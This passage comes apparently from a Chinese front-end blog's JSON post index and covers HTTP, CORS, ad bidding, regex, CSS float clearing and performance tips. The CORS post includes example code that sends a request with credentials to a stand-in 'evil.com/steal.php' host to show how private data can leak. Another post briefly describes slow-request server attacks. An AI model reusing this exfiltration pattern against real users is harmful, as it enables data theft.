Server又不是只给浏览器用，已经完全地超出了HTML服务器的范畴了。\n\nHTTP协议对GET和POST都没有对长度的限制\n\nHTTP协议明确地指出了，HTTP头和Body都没有长度的要求。而对于URL长度上的限制，有两方面的原因造成：\n\n浏览器。据说早期的浏览器会对URL长度做限制。据说IE对URL长度会限制在2048个字符内（流传很广，而且无数同事都表示认同）。但我自己试了一下，我构造了90K的URL通过IE9访问live.com，是正常的。网上的东西，哪怕是Wikipedia上的，也不能信。\n\n服务器。URL长了，对服务器处理也是一种负担。原本一个会话就没有多少数据，现在如果有人恶意地构造几个几M大小的URL，并不停地访问你的服务器。服务器的最大并发数显然会下降。另一种攻击方式是，把告诉服务器Content-Length是一个很大的数，然后只给服务器发一点儿数据，嘿嘿，服务器你就傻等着去吧。哪怕你有超时设置，这种故意的次次访问超时也能让服务器吃不了兜着走。有鉴于此，多数服务器出于安全啦、稳定啦方面的考虑，会给URL长度加限制。但是这个限制是针对所有HTTP请求的，与GET、POST没有关系。","url":"/2015/06/15/post-get/","link":"","plink":"https://thinkerchan.com/2015/06/15/post-get/"},{"title":"CORS跨域资源共享","content":"请求域这段代码放在请求域上 ， 本域地址： http://www.foo.comfunction createCORSRequest(method, url){     var xhr = new XMLHttpRequest();     if (\"withCredentials\" in xhr){          xhr.open(method, url, true);     } else if (typeof XDomainRequest != \"undefined\"){          xhr = new XDomainRequest( ); // IE 浏览器          xhr.open(method, url);     } else {          xhr = null;     }     return xhr;}var request = createCORSRequest(\"get\", \"http://www.evil.com/steal.php\");if (request){     request.onload = function(){ // 请求成功后     alert(request.responseText); // 弹出响应的数据};     request.send(); // 发送请求}\n目标域这段代码放在目标域上 , 本域地址:  http://www.evil.com/steal.php\n&lt;?php header(\"Access-Control-Allow-Origin: http://www.foo.com\"); // header里面存放请求域的地址 ， 如果是通配符 * ，代表可以被任意域请求资源。?&gt;\n即便是 Access-Control-Allow-Origin 不设置请求域的 地址 ，只要请求域向目标域中发送请求，那么目标域一样会接受发送过来的数据，只是浏览器会报错。如果目标域不设置 Access-Control-Allow-Origin: http://www.foo.com，那么隐私数据可以被偷到吗？答案是肯定的。虽然浏览器会报权限错误的问题，但实际上隐私数据已经被目标域的 steal.php 接收到了。\n默认情况下，这样的跨域无法带上目标域的会话（ Cookies 等），需要设置 xhr 实例的withCredentials属性为 true（ IE 还不支持），同时目标域的 steal.php 必须设置如下：\n&lt;?phpheader(\"Access-Control-Allow-Origin: http://www.foo.com\");header(\"Access-Control-Allow-Credentials: true\"); // 允许跨域证书发送//...?&gt;\n有 一 点 需 要 注 意 ， 如果 设 置 了 Access-Control-Allow-Credentials 为 true ，那么Access-Control-Allow-Origin就不能设置为*通配符，这也是浏览器为了安全进行的考虑。有了 CORS 机制，跨域就变得特别方便了，该功能要慎重使用，否则后果会很严重。","url":"/2015/05/30/web-safe/","link":"","plink":"https://thinkerchan.com/2015/05/30/web-safe/"},{"title":"计算广告系列-一张图告诉你什么是计算广告","content":"我们来看一个故事:阿全用chrome开了个隐身窗口(保证此时浏览器是没有任何用户数据的), 接着随便打开CSDN的一篇文章:\n\n隐身窗口第一次打开该页面\n\n可以看到, 底部很明显是一条CSDN自行投放的广告栏, 没毛病, 毕竟挂广告能挣钱. 然而你推送”樱花粉” ,”校验师招聘”是几个意思?\n然而阿全也不是谦虚，堂堂一个撩基能力顶级的程序员怎么就会到北京呢? 哦不, 怎么会对这些广告感兴趣呢? 他想要的是写一个程序, 实现定时发送表白信息给阿宾, 于是从右上角的搜索框输入”短信接口”:\n\n搜索过程\n\n接着页面就推送了以下文章:\n\n搜索结果\n\n没毛病, 这个文章确实是他想要的.不过开发之前需要买一个短信接口, 正当他刚想打开百毒的时候, 他发现原来页面底部的广告变了, 这不刚好嘛, 也不用另外搜索. 直接点就是了, 美滋滋.\n\n广告变了\n\n然后就来到了这个页面:\n\n百毒:” 你看我是不是很了解你?你果然离不开我”(手动滑稽) \n\n 随后他登陆了他的百毒账号, 点啊点, 电话那头就传来了曼妙的声音: “尊敬的全先生……”\n好在阿全搜的只是”短信接口”而已, 要是搜了”XXX”, 估计现在还在莆田没回来…\n\nRTB原理好了, 故事也看完了. 其实就是一个比较典型的计算广告实例, 只不过百毒比较狠, 把SSP,ADX,DSP的角色都抢了.\n接下来用到几个缩写, 我罗列一下:\n\nSSP: Supply Side Platform, 提供方平台\nDSP: Demand-Side Platform, 需求方平台\nADX: Ad Exchange, 广告交易平台\nDMP: Data-Management Platform, 数据管理平台\n\n为了让大家更方便理解, 我尽可能简单化所有的流程, 下面是图:\n\n计算广告竞价流程图\n\n图中涉及了: 用户-&gt;媒体-&gt;SSP-&gt;ADX&lt;-DSP(假定包含DMP)&lt;-广告主\n假如你是某个站点的拥有者, 你有很多用户, 你觉得流量可以变现, 但是又不知道怎么操作.  那你就可以去找一家SSP, 注册你的账号, 在你的站点接入SSP提供的SDK, 用于展示适合你站点的广告.\nSSP之所以叫做SSP, 就是因为它集中了很多媒体(网站/app/游戏等等)资源, 它将会在必要时把这些媒体的有用信息, 比如:\n\n你的站点信息\n你站点用户信息(性别/行为/爱好/坐标等)\n设备尺寸\n广告位尺寸, 广告位类型\n\n等等有用的信息传到ADX.\n那什么才是必要时?\n假设你站点的广告位在网页底部, 当用户滑到底部看到你的广告位时候(也就是存在产生impression的机会), SSP就会按照相关协议向ADX发送一个请求, 将之前说的那些有用信息传过去.\nADX收到请求后，会广播给DSP :\n\n“哎! 我这里有新鲜滚热辣的广告位啊, 你们看看适不适合, 适合的话快来抢啊!”\n\n这个类似广播的行为, 我们称为竞价请求.\n众多DSP接到请求之后, 纷纷从自家DMP里面计算匹配请求中携带的相关信息.\n这时候DSP们收到请求后,心里默默盘算:\n\nDSP1: ‘不太符合我口味, 不要!’DSP2: ‘我再想想…’DSP3:’有点像我想要的伙计哦, 我要!’DSP4:’我想要!’…DSPn:’我想要!’\n\n这实际上就是各家DSP通过一系列算法得出的计算结果.\n如果某个广告位值得争取, 那么DSP就会计算出一个能给自己和广告主带来最大收益的报价. 然后按照相关协议, 给出这个报价, 并附带广告物料以接口的形式返回到ADX.\nADX看到各位DSP选手拿着报价纷纷入场, 也就展开了最激动人心的时刻 - 竞价. (如不了解竞价模式, 可以查看之前写的 &lt;&lt;计算广告系列-竞拍模式&gt;&gt;)\n计算广告竞拍通常使用广义第二竞价(之后会令写一篇文章讲讲), 竞价完成后, 出价最高的人只需要用第二高的价格拍下. 然后ADX将报价和广告物料返回给SSP, 然后媒体再通过SDK完成广告展示, 这看似激烈的一些列活动, 实际上在几百毫秒内就完成了.\nDMP,  ADX, SSP都会从中抽取部分佣金. 剩下的钱自然归媒体.\n以上就是一个计算广告竞价的原理, 通常称为实时竞价(RTB, Real Time Bidding)\n所给流程图只是一个尽可能的简单描述的例子, 实际上DSP-&gt;ADX这个步骤非常有可能重复了多次.\n\n本次分享完毕, 下篇我再讲讲一些有意思的, 比如说:\n\n为什么要用竞拍的方式买广告?\nDSP是怎么挣钱的?\n\n谢谢各位.\n欢迎关注我的公众号: 测试狗","url":"/2019/03/21/what-is-computational-advertising/","link":"","plink":"https://thinkerchan.com/2019/03/21/what-is-computational-advertising/"},{"title":"WWW or not?","content":"用户习惯不带www的域名为顶级域名或一级域名，如thinkerchan.com 带www的为二级域名，如www.thinkerchan.com 在购买域名时，域名本身是不带有www的，但由于域名要通过DNS服务器解析后才可以使用，在这个过程中每一个域名是会指向一个web服务器ip地址，由于在很早之前网站方都会增加一个”www”的子域名来帮助客户以更多的路径访问网站，久而久之就形成了输入URL的时候都打上ww来访问网站.\n如果没有做www的解析,那么 www.xxx.com  就不能访问，只能访问 xxx.com  顶级域名。对于普通用户来说，这个问题可能会造成他访问不了,因为他们只”记得”要输”www”,可能不知道xxx.com也是同样可以访问的.所以我们在购买空间域名时，服务商也会随手就帮你做了这个”www”的解析，当然，这个解析的服务器地址是和没有”www”是一样的的.\n有和没有的区别用户体验上来说,几乎没有啥区别,硬要说有,那就是域名看起来更加简洁易记.但是对搜索引擎来说,影响就非常大了.在google和baidu上site自己的网站的时候,发现不带www会比带www被收录得更多.不信你可以试试…我懒得贴图了…\n这种情况就关乎SEO优化了.不过在这方面我还是小白.\n以下是搜来的建议:\n\n百度判断你不带www的域名为主域名，会给予比带www更高的权重，所以导致收录会相对较多。另一方面，在域名不做处理的情况下，我们一般是用带www的域名去做外链的，而你新手所做的外链质量一般比较低，影响带www的域名收录.\n由于没有对域名做任何处理，不管哪个被认为是首选域名，百度仍会认为你是两个域名。这样就会分散网站权重，不利于我们优化网站。尤其不利于优化带www的域名.\n\n301重定向如果你想把你的带www域名作为首选域名来优化，那么只需把顶级域名做301即可,301是永久重定向.对搜索引擎优化没有任何不良影响.\n欲知更多,请参考:卢松松-详解301永久重定向实现方法","url":"/2015/06/16/www-or-not/","link":"","plink":"https://thinkerchan.com/2015/06/16/www-or-not/"},{"title":"正则表达式快速入门","content":"元字符元字符是功能性的匹配符号, 如:\\b 单词的开头或结尾，也就是单词的分界处* 匹配任意数量的字符. 匹配除了换行之外的所有字符\\d 匹配0到9单个数字\\s 匹配任意的空白符，包括空格，制表符(Tab)，换行符，中文全角空格等\\w匹配 字母 或 数字 或 下划线 或 汉字 等^ 匹配字符串的开始$ 匹配字符串的结束\n例子\\ba\\w*\\b 匹配以字母a开头的单词——先是某个单词开始处(\\b)，然后是字母a,然后是任意数量的字母或数字(\\w)，最后是单词结束处(\\b)0\\d\\d-\\d\\d\\d\\d\\d\\d\\d\\d匹配这样的字符串：以0开头，然后是两个数字，然后是一个连字号“-”，最后是8个数字, 简写成0\\d{2}-\\d{8} , {}是限定符^\\d{5,12}$ QQ号必须为5位到12位数字 {5,12}表示次数不能少于5次，不能多于12次\\d+匹配1个或更多连续的数字。这里的+是和`类似的元字符，不同的是*匹配重复任意次(可能是0次)，而+则匹配重复1次或更多次\\b\\w{6}\\b` 匹配刚好6个字符的单词。\n字符转意查找元字符本身的话，比如你查找.,或者*,就出现了问题：你没办法指定它们，因为它们会被解释成别的意思。这时你就得使用\\来取消这些字符的特殊意义。因此，你应该使用\\.和\\*。当然，要查找\\本身，你也得用\\\\\n重复\n\n\n符号\n表示\n\n\n\n\n*\n重复零次或更多次\n\n\n+\n重复一次或更多次\n\n\n?\n重复零次或一次\n\n\n{n}\n重复n次\n\n\n{n,}\n重复n次或更多次\n\n\n{n,m}\n重复n到m次\n\n\n\n字符类[ ] 集合查找 ,比如 [abcde] 表示匹配里面包含的字符 , 常见的[0-9]和\\d等价, 即匹配一位数字, [a-z0-9A-Z_]也完全等同于\\w（如果只考虑英文的话）\\(?0\\d{2}[) -]?\\d{8}首先是一个转义字符\\(,它能出现0次或1次?,然后是一个0，后面跟着2个数字\\d{2}，然后是)或-或空格中的一个，它出现0次或1次?，最后是8个数字\\d{8}\n分枝条件上面那个表达式也能匹配010)12345678或(022-87654321这样的“不正确”的格式。正则表达式里的分枝条件指的是有几种规则，如果满足其中任意一种规则都应该当成匹配，具体方法是用|把不同的规则分隔开。0\\d{2}-\\d{8}|0\\d{3}-\\d{7}表示0开头接两位数字,-后面连着8位数的电话号码,比如020-12345678 或者 0开头接三位数字,-后面连着7位数的电话号码,比如0751-1234567使用分枝条件时，要注意各个条件的顺序。原因是匹配分枝条件时，将会从左到右地测试每个条件，如果满足了某个分枝的话，就不会去再管其它的条件了。\n分组如果想要重复多个字符又,你可以用小括号来指定子表达式(也叫做分组)(\\d{1,3}\\.){3}\\d{1,3}是一个简单的IP地址匹配表达式。要理解这个表达式，请按下列顺序分析它：\\d{1,3}匹配1到3位的数字，(\\d{1,3}\\.){3}匹配三位数字加上一个英文句号(这个整体也就是这个分组)重复3次，最后再加上一个一到三位的数字(\\d{1,3})。正则表达式中并不提供关于数学的任何功能，所以只能使用冗长的分组，选择，字符类来描述一个正确的IP地址：((2[0-4]\\d|25[0-5]|[01]?\\d\\d?)\\.){3}(2[0-4]\\d|25[0-5]|[01]?\\d\\d?)\n反义有时需要查找不属于某个能简单定义的字符类的字符。比如想查找除了数字以外，其它任意字符都行的情况，这时需要用到反义：\n\n\n\n符号\n表示\n\n\n\n\n\\W\n匹配任意不是字母，数字，下划线，汉字的字符\n\n\n\\S\n匹配任意不是空白符的字符\n\n\n\\D\n匹配任意非数字的字符\n\n\n\\B\n匹配不是单词开头或结束的位置\n\n\n[ ^x ]\n匹配除了x以外的任意字符\n\n\n[ ^aeiou ]\n匹配除了aeiou这几个字母以外的任意字符\n\n\n\n例子：\\S+匹配不包含空白符的字符串。&lt;a[^&gt;]+&gt;匹配用尖括号括起来的以a开头的字符串\n后向引用待学习\n零宽断言待学习\n负向零宽断言待学习\n注释待学习\n贪婪与懒惰当正则表达式中包含能接受重复的限定符时，通常的行为是（在使整个表达式能得到匹配的前提下）匹配尽可能多的字符。以这个表达式为例：a.*b，它将会匹配最长的以a开始，以b结束的字符串。如果用它来搜索aabab的话，它会匹配整个字符串aabab。这被称为贪婪匹配。有时，我们更需要懒惰匹配，也就是匹配尽可能少的字符。前面给出的限定符都可以被转化为懒惰匹配模式，只要在它后面加上一个问号?。这样.*?就意味着匹配任意数量的重复，但是在能使整个匹配成功的前提下使用最少的重复。a.*?b匹配最短的，以a开始，以b结束的字符串。如果把它应用于aabab的话，它会匹配aab（第一到第三个字符）和ab（第四到第五个字符）为什么第一个匹配是aab（第一到第三个字符）而不是ab（第二到第三个字符）？简单地说，因为正则表达式有另一条规则，比懒惰／贪婪规则的优先级更高：最先开始的匹配拥有最高的优先权\n\n\n\n符号\n表示\n\n\n\n\n*?\n重复任意次，但尽可能少重复\n\n\n+?\n重复1次或更多次，但尽可能少重复\n\n\n??\n重复0次或1次，但尽可能少重复\n\n\n{n,m}?\n重复n到m次，但尽可能少重复\n\n\n{n,}?\n重复n次以上，但尽可能少重复\n\n\n\n参考: http://deerchao.net/tutorials/regex/regex.htm","url":"/2016/01/05/regex/","link":"","plink":"https://thinkerchan.com/2016/01/05/regex/"},{"title":"Overflow:hidden的bug是什么?","content":"清除浮动的方式空元素撑开父层&lt;div class=\"wrap\"&gt;    &lt;div class=\"div1\"&gt;&lt;/div&gt;    &lt;div class=\"div2\"&gt;&lt;/div&gt;    &lt;div style=\"clear:both\"&gt;&lt;/div&gt; &lt;div&gt;\n缺点:增加无意义的标签,对以后维护不利\n利用br的clear属性&lt;div class=\"wrap\"&gt;    &lt;div class=\"div1\"&gt;&lt;/div&gt;    &lt;div class=\"div2\"&gt;&lt;/div&gt;    &lt;br clear=\"both\"&gt; &lt;div&gt;\n缺点:结构和表现混合,和方法一类似\n父级overflow:auto&lt;div class=\"wrap\"&gt;    &lt;div class=\"div1\"&gt;&lt;/div&gt;    &lt;div class=\"div2\"&gt;&lt;/div&gt; &lt;div&gt;\n缺点:低版本IE会出现滚动条\n父级display:table缺点:盒模型属性已经改变,会在低版本IE中造成一系列问题\n利用伪元素版本1:先定义两个class:.clearfix:after {content:\"\\20\"; display:block; height:0; clear: both;visibility: hidden; }.clearfix { *zoom:1; }\n这是目前最常见的清浮方式，IE6、7通过zoom:1触发hasLayout特性\n缺点:貌似又多了点代码，当然可以忽略不计\n版本2:.floatfix:after{content: \"\";display: table;clear:both;}\noverflow:hidden在厂里面常常有人用clearfix来清浮,但是我通常用的是OH来清浮,老大说这样又问题,困惑至今。网上搜到一篇overflow:hidden相关的说明文档，但是年代久远，其中的bug本人亲测没能还原出来，希望得到解答。","url":"/2015/05/31/where-is-the-bug-of-Overflow-hidden/","link":"","plink":"https://thinkerchan.com/2015/05/31/where-is-the-bug-of-Overflow-hidden/"},{"title":"雅虎34条","content":"参考1:官方传送门在此,请肆意点击.参考2:中文原文传送门在此,请肆意点击.参考3:中文原文传送门在此,请肆意点击.\n1.尽量减少HTTP请求次数什么是HTTP请求?每一次网页内容的获取,就是HTTP请求的具体展现.不同浏览器的请求并发数是有限的,知乎已经有大神解释这个问题了,拿去.常见的优化有:\n\n合并文件(典型案例:雪碧图)\n图片Base64编码\n\n2.减少DNS查找次数访问域名的时候,DNS解析服务器就会返回这个域名对应的IP地址。DNS解析的过程同样也是需要时间的。一般情况下返回给定域名对应的IP地址会花费20到120毫秒的时间。而且在这个过程中浏览器什么都不会做直到DNS查找完毕。\n缓存DNS查找可以改善页面性能。这种缓存需要一个特定的缓存服务器，这种服务器一般属于用户的ISP提供商或者本地局域网控制，但是它同样会在用户使用的计算机上产生缓存。DNS信息会保留在操作系统的DNS缓存中（微软Windows系统中DNS Client Service）。大多数浏览器有独立于操作系统以外的自己的缓存。由于浏览器有自己的缓存记录，因此在一次请求中它不会受到操作系统的影响。\n\n问题来了: 子域的数量和DNS查询效率?\n\n3.避免跳转\n对搜索引擎影响大\n请求数变多\n用户体验变差\n\n4.使用Ajax缓存\nGet和Post请求,Get是可以被缓存的,没有被修改就返回304.\n不是所有的Ajax请求都需要缓存,否则和静态资源没区别\n\n5.推迟加载内容\n按需加载/懒加载\n\n6.预加载\n提升用户体验\n\n7.减少DOM元素\nDOM越多,查询越慢\n\n8.划分子域\n每个域的并发请求数量限制\n\n9.减少iframe数量\n这货是阻塞加载\n\n10.避免重定向\n301 永久重定向, 即: 假如我要请求a.com,但是却跳到了b.com,a.com会发请求到b.com,浪费时间. 但是搜索引擎可以智能跳过.\n302 临时重定向, 即:页面找到,但是不在原始位置,重新查找.搜索引擎依然机械这一过程.\n这两个状态码对搜索引擎差别非常大,这两个行为增加了服务器的访问次数.\n\n11.使用CDN内容分发网络.\n12.为文件头指定Expires或Cache-Control\n如过Apache开启了expire模块,浏览器发送资源请求的时候,服务器返回资源的同时,返回一个expire的http头,这是一个时间值,表示资源在本地的过期时间.这个值会存在本地,如果再返回来的值不超过规定时间,那么就一直使用这个资源不再发送HTTP请求\nCache-Control,HTTP协议中常用头部之一,负责页面缓存机制.有更多的选项,处理方式也更多.\n\n13.开启Gzip压缩\n略\n\n14.配置Etag(实体标签)\nEntity Tag,属于HTTP协议,受Web服务支持,它使用特殊的字符串来标识某个请求的版本.如果浏览器和服务器的Etag一致,那么该资源就没有改变,服务器便会发送回一个极短的响应，包含HTTP “304 未修改”的状态,前端使用本地缓存.生成ETag常用的方法包括对资源内容使用抗碰撞散列函数，使用最近修改的时间戳的哈希值，甚至只是一个版本号。为了避免使用过时的缓存数据，用于生成ETag的方法应保证（同时尽可能的实用）每一个ETag都是唯一的。\n这里有一个浏览器缓存详解:expires,cache-control,last-modified,etag详细说明\n\n15.尽早刷新输出缓冲\n待补充\n\n16.使用GET来完成AJAX请求\n因为可缓存\n\n17.把样式表置于顶部\n避免页面闪烁和重绘\n\n18.避免使用CSS表达式（Expression）\n吃性能\n\n19.使用外部JavaScript和CSS\n可缓存\n重用率价值大\n外部压缩价值大\n\n20.压缩合并JavaScript和CSS\n略\n\n21.用代替@import先来看看这两个的区别:link:\n\nlink是XHTML标签，除了加载CSS外，还可以定义RSS等其他事务；@import属于CSS范畴，只能加载CSS。\nlink引用CSS时，在页面载入时同时加载；@import需要页面网页完全载入以后加载。\nlink是XHTML标签，无兼容问题；@import是在CSS2.1提出的，低版本的浏览器不支持。\nlink支持使用Javascript控制DOM去改变样式.\n\n@import:\n\n语法:@import url(style.css)\n增加请求\n不支持DOM操作\n\n22.避免使用滤镜\nIE的东西, 略\n\n23.把脚本置于页面底部\n略\n\n24.剔除重复脚本\n略\n\n25.减少DOM访问\nDOM的操作很慢\n\n26.开发智能事件处理程序\n合理使用冒泡/捕获\n\n27.减小Cookie体积\n去除没有必要的cookie，如果网页不需要cookie就完全禁掉\n将cookie的大小减到最小\n注意cookie设置的domain级别，没有必要情况下不要影响到sub-domain\n设置合适的过期时间，比较长的过期时间可以提高响应速度\n\n28.对于页面内容使用无coockie域名\n待补充\n\n29.优化图像\n这个不用说了吧…\n\n30.优化CSS Spirite\nSpirite中水平排列图片，垂直排列会增加文件大小；\nSpirite中把颜色较近的组合在一起可以降低颜色数，理想状况是低于256色以便适用PNG8格式；\n不要在Spirite的图像中间留有较大空隙。这虽然不大会增加文件大小,但对于用户代理来说它需要更少的内存来把图片解压为像素地图。100×100的图片为1万像素，1000×1000就是100万像素。\n\n31.不要在HTML中缩放图像我们来看看W3school给出的解释\n\n您是否见过当文档加载时其内容会显示不规律的移动。之所以会这样，是因为浏览器为了能够显示每一个加载的图像，而不断地重新调整页面的布局。浏览器通过下载并解析出图像的宽度和高度来决定图像的大小，然后就会在显示窗口中留出一个相应的矩形空间。然后浏览器就会调整页面的显示布局，以便把图像插入到显示当中。这同时也告诉我们，图像是独立的文件，它与源文件都分别是独立加载的。\n但是这不是一种最有效的显示文档的方法，因为浏览器在显示相邻的以及后面的文档内容之前，必须要检查每一个图像文件，并计算它们的屏幕空间。这可能会给文档的显示带来非常大的延迟，从而打断用户的阅读。\n对于创作者来说，一种更为有效的方法是通过 &lt;img&gt; 标签的 height 和 width 属性来指定图像的尺寸。这样的话，浏览器在下载图像之前就为其预留出了位置，从而可以加速文档的显示，还可以避免文档内容的移动。这两个属性都要求是整数值，并以像素为单位来表示图像尺寸。这两个属性在 &lt;img&gt; 标签中出现的次序并不重要。\n\n说了那么多,其实就是避免重绘\n32.favicon.ico要小而且可缓存\n网站图标文件favicon.ico，不管你服务器有还是没有，浏览器都会去尝试请求这个图标。所以必须存在,以避免404\n文件尽量小，最好小于1k\n设置一个长的过期时间\n\n33.保持单个内容小于25K\n这限制是因为iphone，他只能缓存小于25K，注意这是解压后的大小。所以单纯gzip不一定够用，精简文件工具要用上了。\n\n34.打包组件成复合文本\n略","url":"/2015/06/15/yahoo34/","link":"","plink":"https://thinkerchan.com/2015/06/15/yahoo34/"},{"title":"【奇技淫巧】安卓微信视频播放全屏问题处理","content":"安卓全屏问题视频全屏的H5专题十分收到业界喜欢, 虽然iOS下全屏自动播放并没有太大问题, 然而在安卓手机上，video组件全屏的时候会在顶层，好像”漂浮”在整个浏览器上面, 体验起来非常差. 除此之外, 即便采用JS给video设定为容器的宽高这方案, 也会出现难看的播放器控件,这时候不得不人为给视频底部加空白,在通过JS计算适合的高度以挡掉丑陋的播放器控件, 实在苦恼.\nJSMpeg简介偶然发现JSMpeg这个项目,能解决安卓全屏video漂浮问题问题.\n它的原理就是JS解码视频, 用 WebGL &amp; Canvas2D渲染出来,于是达到避免Video控件在安卓微信浏览器下产生的问题, 不过有一个需要说明的地方就是, 你需要用将你的视频文件(通常是mp4)转换成ts格式的视频文件, 并且 ,在iOS下的微信浏览器下, 使用jsmpeg播放ts文件, 是没有声音的,这个时候你可以另外添加对应的audio同步播放即可. (其实iOS我们直接使用video+mp4的方式,也用不到这个插件).\n推荐使用http://ffmpeg.org/, 至于怎么安装就不再赘述.\n生产ts视频文件命令：    $ ffmpeg -i input.mp4 -f mpegts -codec:v mpeg1video -codec:a mp2 -b 0 output.ts\n这个时候, 默认转换到最低的清晰度, 如果要调整清晰度, 可以像这样调整:$ ffmpeg -i input.mp4 -f mpegts -codec:v mpeg1video -codec:a mp2 -b:v 1500k output.ts\nJSMpeg调用&lt;canvas id = &quot;canvas&quot;&gt;&lt;/canvas&gt;&lt;script&gt;\t var player = new JSMpeg.Player(&apos;video.ts&apos;, {    \tcanvas: canvas,        loop: false,       progressive: true, //渐进加载,false的话则会先下载完再渲染       autoplay:true    });   &lt;/script&gt;\n当然你也直接在HTML中使用\n&lt;div class=&quot;jsmpeg&quot; \tdata-url=&quot;video.ts&quot;     data-loop=&quot;false&quot;     data-autoplay=&quot;true&quot;&gt;&lt;/div&gt;\n缺点虽然这个方案能实现安卓下canvas播放视频, 但本人实测,它实在是太耗性能了(华为p10都会卡), 并不像作者所说的的流畅. \n\nJSMpeg can decode 720p Video at 30fps on an iPhone 5S, works in any modern browser (Chrome, Firefox, Safari, Edge) and comes in at just 20kb gzipped.\n\n所以究竟能不能用这个方案, 得根据需求自行斟酌.\nDEMO点击这里体验Demo\n或者直接扫描","url":"/2017/05/31/安卓微信视频播放全屏问题处理/","link":"","plink":"https://thinkerchan.com/2017/05/31/安卓微信视频播放全屏问题处理/"},{"title":"正则表达式js版本","content":"笔记// 字符类var reg = /[abc]/ //表示一类特征var reg2= /[^abc]/ //非reg// 范围类var reg3 = /[a-zA-Z]/// 预定义类(^在[]里面是取反)// \\. =&gt; [^\\r\\n]  除了换行和回车之外的字符// \\d =&gt; [0-9]    数字// \\D =&gt; [^0-9]   非数字// \\s =&gt; [\\t\\n\\x0B\\f\\r] 空白// \\S =&gt; [^\\t\\n\\x0B\\f\\r]  非空白// \\w =&gt; [a-zA-Z_0-9]   字母数字下划线// \\W =&gt; [^a-zA-Z_0-9]// 边界// ^ 开头// &amp; 结尾// \\b 单词边界// \\B 非单词边界// 量词// ? 0次或者1次// + 出现1次或者多次// * 任意次// {n} 出现n次// {n,m} n 到 m次// {n,}至少n次// 贪婪模式(默认)12345678.replace(/\\d{3,6}/g,&apos;X&apos;); // X78// 非贪婪模式12345678.replace(/\\d{3,6}?/g,&apos;X&apos;); // XX78// 分组var reg4 = /(&apos;thinkerchan&apos;){3}/// 或var reg5 = /(a|b)/;// 反向引用// 2015-12-25 -&gt; 12/25/2015&apos;2015-12-25&apos;.replace(/(\\d{4})-(\\d{2})-(\\d{2})/g,&apos;$2/$3/$1&apos;) // (变量) 要用括号阔起来// 忽略分组&apos;2015-12-25&apos;.replace(/(?:\\d{4})-(\\d{2})-(\\d{2})/g,&apos;$1/$2&apos;)  // 12/25 , ?:就跳过了这个(\\d{4})分组// 前瞻, 正则表达式从头到尾解析, 文本尾部叫做&quot;前&quot;, 文本头部叫做&quot;后&quot;&apos;a2*3&apos;.replace(/\\w(?=\\d)/g,&apos;X&apos;) // X2*3  前瞻部分只做参考&apos;a2*3&apos;.replace(/\\w(?!\\d)/g,&apos;X&apos;) //aX*X// 后顾(JS不支持)// JS对象属性  (修饰符 i,g,m)var reg6 = /\\w/;console.log(reg6.source)  // 正则本身// 以下三个默认值 g,m,i都为false, 都是只读的属性console.log(reg6.global)  // falseconsole.log(reg6.multiline) //falseconsole.log(reg6.ignoreCase)  //false// test和exec //略var reg6 = /\\w/greg6.test(&apos;ab&apos;) //truereg6.test(&apos;ab&apos;) //truereg6.test(&apos;ab&apos;) //false  这是laseIndex属性影响的// 字符串对象方法&apos;abc&apos;.search(&apos;a&apos;) // 0 , 不存在就 -1","url":"/2016/06/01/正则表达式JS版本/","link":"","plink":"https://thinkerchan.com/2016/06/01/正则表达式JS版本/"},{"title":"正则表达式php版本","content":"界定符// 界定符,不是正则的的部分// $reg = '//';// 原子,可见原子,不可见原子(空格,换行(\\n),tab(\\t)等). 最小的匹配单位\n元字符// 原子的筛选方式:// 1) |,匹配两个或者多个分支选择// 2) [],匹配方括号中的任意一个原子(方括号内必须是原子)// 3) [^],匹配除方括号中原子之外的任意字符(这种情况下^必须在首)\n常见原子集合// \\. 除换行符之外的任意字符// \\d [0-9]// \\D [^0-9]// \\s 不可见原子,即常见的空格,换行等 [\\f\\n\\r\\t\\v]// \\S 可见原子, [^\\f\\n\\r\\t\\v]// \\w [0-9a-zA-Z_]// \\W [^0-9a-zA-Z_]\n量词// 量词(放在元字符背后)// {n}   恰好出现n次// {n,}  前面的原子至少出现n次// {n,m} 至少n次,至多m次// *     {0,} 可以理解成{0,∞}// +     {0,} 可以理解成{1,∞}// ?     {0,} 可以理解成{0,1}\n边界控制// 边界控制// ^  开始// $  结束// () 模式单元 (D|d)uang\n修正模式// 假如有一组电话号码: 020-3456789// 懒惰匹配(默认) : \\d+\\-\\d+  =&gt; 020-3456789// 贪婪匹配 : \\d?\\-\\d?  =&gt; 0-3  , 或者 &apos;/imooc.+123/U&apos; (仅限PHP)// 忽略大小写 &apos;/iMoOc.+123/i&apos;// 忽略空白符 &apos;/im o o c.+123/x&apos;// 匹配所有字符 &apos;/im o o c.+123/s&apos;\n常见正则邮箱: ^\\w+(\\.\\w+)*@\\w+(\\.\\w+)+$URL: (\\w+:\\/\\/)?\\w+(\\.\\w+)+[a-z]$常用URL: (https?:\\/\\/)?(\\w+\\.)+[a-zA-Z]+// moreEmail : /^[_a-zA-Z0-9-]+(\\.[_a-zA-Z0-9-]+)*@[a-zA-Z0-9-]+(\\.[a-zA-Z0-9-]+)*(\\.[a-zA-Z]{2,3})$/iMobile : /^1[34758]\\d{9}$/Url: /^(https?):\\/\\/[^\\s&amp;&lt;&gt;#;,&quot;\\&apos;\\?]+(|#[^\\s&lt;&gt;;&quot;\\&apos;]*|\\?[^\\s&lt;&gt;;&quot;\\&apos;]*)$/i,Company: /^[\\u4e00-\\u9fa5a-zA-Z0-9\\-\\·]+$/,OrganizationCode: /^[A-Za-z0-9]{15}$/,Name: /^[\\u4e00-\\u9fa5a-zA-Z]+$/,Position: /^[\\u4e00-\\u9fa5a-zA-Z\\-]+$/","url":"/2016/05/24/正则表达式笔记/","link":"","plink":"https://thinkerchan.com/2016/05/24/正则表达式笔记/"},{"title":"Javascript高级技巧(一)","content":"作用域安全的构造函数这是常见的构造函数:function Person(name, age, job){\tthis.name = name;\tthis.age = age;\tthis.job = job;}var person = new Person(\"Nicholas\", 29, \"Software Engineer\");     // new\n假设:var person1 = Person(\"test\",22,\"FE\");\n那么 这个新对象的属性将会被绑定在window对象上面, 如果当前环境存在 window.name的操作 那么可能就会造成错误.\n解决方法:(域安全的构造函数)\n先判断this是否为该构造函数的实例function Person(name, age, job){\tif (this instanceof Person){\t\tthis.name = name;\t\tthis.age = age;\t\tthis.job = job;\t} else {\t\treturn new Person(name, age, job);\t}}var person1 = Person(\"Nicholas\", 29, \"Software Engineer\");alert(window.name); //\"\"alert(person1.name); //\"Nicholas\"var person2 = new Person(\"Shelby\", 34, \"Ergonomist\");alert(person2.name); //\"Shelby\"\n缺点:function Polygon(sides){               if (this instanceof Polygon) {                    this.sides = 